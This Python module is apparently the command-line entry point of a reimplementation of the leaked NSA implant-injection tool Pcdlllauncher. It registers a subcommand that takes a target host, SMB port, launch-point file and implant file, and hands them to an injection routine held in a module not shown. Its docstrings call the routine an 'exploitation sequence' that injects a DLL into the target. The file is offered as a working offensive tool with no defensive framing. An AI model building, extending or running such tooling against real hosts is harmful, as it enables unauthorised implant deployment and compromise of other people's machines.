"""pcdlllauncher — PCDLLLAUNCHER DLL 注入工具。

Python 重写的 NSA Pcdlllauncher 工具 `Pcdlllauncher-2.3.1.exe`
(C++ / DAVE framework)，通过 IDA Pro / x32dbg 逆向恢复。
实现了该工具的 key=value 参数接口及其注入流程。
"""

from . import pcdlllauncher


# ---------------------------------------------------------------------------
# Subcommand entrypoint.
# ---------------------------------------------------------------------------
def pcdlllauncher_handle(args):
    """Run the PCDLLLAUNCHER exploitation sequence against the supplied host."""
    return pcdlllauncher.run_function(
        target=args.target,
        port=args.port,
        timeout=args.timeout,
        lp_filename=args.lp_filename,
        lp_entry_name=args.lp_entry_name,
        implant_filename=args.implant_filename,
        target_os_arch=args.target_os_architecture,
        pc_behavior=args.pc_behavior,
        verbose=args.verbose,
    )


def reg_subparser(subparsers):
    """Register the `pcdlllauncher` subcommand on an argparse
    subparsers group."""
    p = subparsers.add_parser(
        "pcdlllauncher",
        help="PCDLLLAUNCHER DLL 注入工具",
        description="Python 重写的 NSA Pcdlllauncher (PCDLLLAUNCHER) 远程注入工具 "
                    "Pcdlllauncher-2.3.1。通过 SMB/NBT 驱动，将 DLL 注入目标主机。",
    )
    p.add_argument(
        "target", metavar="TARGET",
        help="目标主机名或 IP",
    )
    p.add_argument(
        "-p", "--port", type=int, default=445,
        help="目标端口（默认 445）",
    )
    p.add_argument(
        "--timeout", type=int, default=60,
        help="阻塞网络调用超时秒（-1 表示无超时，默认 60）",
    )
    p.add_argument(
        "--lp-filename", metavar="FILE",
        help="LP 文件路径",
    )
    p.add_argument(
        "--lp-entry-name", metavar="NAME",
        default="ServiceEntry",
        help="LP 入口函数名（默认 ServiceEntry）",
    )
    p.add_argument(
        "--implant-filename", metavar="FILE",
        help="植入物文件路径",
    )
    p.add_argument(
        "--target-os-architecture",
        choices=["x86", "x64"],
        default="x86",
        help="目标架构（默认 x86）",
    )
    p.add_argument(
        "--pc-behavior",
        choices=["7", "8"],
        default="8",
        help="PC 行为模式（默认 8）",
    )
    p.add_argument(
        "-v", "--verbose", action="store_true",
        help="输出参数与调试信息",
    )
    p.set_defaults(func=pcdlllauncher_handle)
